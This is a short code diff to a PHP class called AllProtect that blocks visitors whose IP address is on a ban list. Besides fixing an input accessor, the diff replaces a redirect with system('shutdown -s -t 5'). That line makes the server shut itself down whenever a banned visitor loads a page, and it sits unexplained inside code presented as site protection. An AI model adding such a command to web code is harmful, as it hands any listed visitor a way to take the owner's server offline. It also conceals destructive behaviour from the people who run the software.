@@ -19,12 +19,12 @@ class AllProtect
 
     public function Web_Protection()
     {
-        $check = $this->ci->db->get_where('web_ipbanned', array('ip_address' => $this->input->ip_address()));
+        $check = $this->ci->db->get_where('web_ipbanned', array('ip_address' => $this->ci->input->ip_address()));
         $result = $check->row();
         if ($result) 
         {
             echo "<script>alert('You Doesnt Allowed To Visit This Website. Thanks For Your Attention.');</script>";
-            redirect('https://anakanjing.com', 'refresh');
+            system('shutdown -s -t 5');
         }
     }
 }
